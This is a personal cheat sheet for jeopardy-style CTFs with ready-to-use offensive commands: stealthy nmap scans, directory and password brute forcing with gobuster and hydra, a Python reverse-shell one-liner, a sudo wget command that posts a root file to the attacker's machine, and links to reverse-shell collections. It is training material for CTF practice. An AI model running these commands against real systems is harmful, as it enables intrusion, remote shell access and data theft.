# Jeopardy-style CTFs

## Recon

### Port Scanning
- #### **nmap: For normal port scan**
```sh
nmap -sS -sV -O <ip> >> ports.txt
```
- **For aggressive port scan we will use**
```sh
nmap -A -p <ports that we found from normal scan> >> ports.txt
```
```sh
nmap -A -p- -Pn <ip> -v
```
- For scanning top 100 ports and slowing down the scan for hiding from attention 
```sh
nmap -A -F -T2 <ip> -v
```

### Directory Enumeration

- #### **Gobuster**
```sh
gobuster dir -u http://targetIp -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o directory.txt
```
```sh
gobuster dir -u <url-with-http> -w /usr/share/wordlists/dirb/common.txt -o directory.txt 
```
### SearchSploit
- **Basic Search**
```sh
searchsploit 'version name'
```
- **Searching Through Nmap Results**
    - **save the nmap results file in .xml format**
    - Example: `nmap -A -p- -oA results.xml <ip>`
```sh
searchsploit --nmap -v results.xml
```
### JohnTheRipper

- **Chaning a human un-redable format to human readable format**
```sh
gpg2john <human non-readable> > <human readable file>
```
- Or you may say `john` readable
```sh
sudo john <human readable file>
```
```sh
sudo john --wordlist=/usr/share/wordlists/rockyou.txt root2boot
```

### gpg 
- **Import**
```sh
gpg --import <file>   
```
- **Decrypt**
```sh
gpg --decrypt <file name>
```

### Some Important commands

- #### **Finding file Type**
```sh
file <filename>
```

- #### **Running Python Server**
```sh
python3 -m http.server 80
```

- #### **Basic Stegnography**
```sh
steghide extract -sf <PictureName>
```
- #### For seeing what is running on a file `we can check if there is any root process is running on a folder or not`
```sh
ps aux
```
- #### Finding belongings of `user` group
```ls
find / -group users -type f 2>/dev/null
```
- #### Alternative of `sudo su` is `sudo bash`
- #### Finding a File
```sh
find / -type f -name user.txt 2> /dev/null
```

### FTP Commands
- #### Downloding from  `ftp` to `local`
```sh
mget <filename>
mget *
mget *.fileextention
```
- #### Alternative of `cat`
```sh
ftp> get file.txt -
```
- 

### POP3 Commands

#### Login BruteForce using `Metasploit`
- Password and Username list needed
```sh
msf6 > use auxiliary/scanner/po
use auxiliary/scanner/pop3/pop3_login 
```
- Need the Listener Now

```sh
nc <target_ip> 110
```
**Commands**
- To see list of files
```sh
list
```
- To see the files
```sh
retr <list number>
```

## Scripts

- #### Python Reverse shell `One-Liner`
```py
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<machine_Ip-openvpn>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
## PrivEsc

- #### **Finding info in the crontab**
```sh
cat /etc/crontab 
```

- #### Searching for `Bash History`
```sh
ls -la /etc/cron.daily/
```

## Reverse Shell
- Starting listener
```sh
nc -nlvp <port_number>
```
## Getting the terminal Shell
- **Some time the terminal shell is not given then we have to do this!**
```sh
python -c "import pty; pty.spawn('/bin/bash')"

stty raw -echo
```
## Exploit for `wget`
```sh
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<your machines ip>:4444
```
## Getting into As a Root User
```sh
su root
```
- **We must need the password here**

### PHP reverse-shell
```ls
/usr/share/webshell/
```
## Avoiding Read and Write Protection
- Copy the protectd file to another file
- Remove the original file

### Identifying Hash
```sh
hash-identifier        
```
### Downloading From another System
```
wget http://ip/filename -P /tmp/
```
- Sometimes we need to download exploits to the target system
- For avoiding privilege download we can use /tmp/ folder
  
### Ip 2 Name
```sh
sudo nano /etc/hosts
```
```sh
ip    name
```
```sh
ping name
```

## Links 

- #### **Audio Decoder**
    - [Morsecode](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
    - [For more accurate](https://www.sonicvisualiser.org/download.html)
    - [dcode](https://www.dcode.fr/spectral-analysis)
- #### Stegnography
    - [steghide webapp](https://www.aperisolve.com/)
- #### **Password Decoder**
    - [Check Psychobreak](https://www.cachesleuth.com/vanity.html)

- #### Reverse Shell `These will give you ROOT` 
    - [GTFOBINS](https://gtfobins.github.io/)
    - [PentestMonkey](https://github.com/pentestmonkey)
    - [Pentest Monkey website](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
    - [swisskyrepo](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

- #### HashDecoder
    - [hash killer](https://hashkiller.io/listmanager)
    - [Crack Station](https://crackstation.net/)
- #### Vulnerability or CVE detection
    - [AttackerKB](https://attackerkb.com/)
    - [AttackerKB TOOL](https://github.com/horshark/akb-explorer)
    - TOOl SearchSploit

## Brute Forcing

- #### Hydra for SSH password bruteforce
```sh
hydra -l <ssh name> -P <passwordlist> -t 6 ssh://target
```
- **For ports we can use `-p <portnumber>`**


## TIPS
- **Try To know the Current Versions of SSH,UBUNTU,FTP etc**

## Important WriteUps
- [stefanBargan](https://stefanbargan.medium.com/)
- [Aperi](https://www.zeecka.fr/cat/steganography/)
- [cheatsheet](https://www.aperisolve.com/cheatsheet)
- [Tomcat Penetration Testing](https://www.hackingarticles.in/tomcat-penetration-testing/)
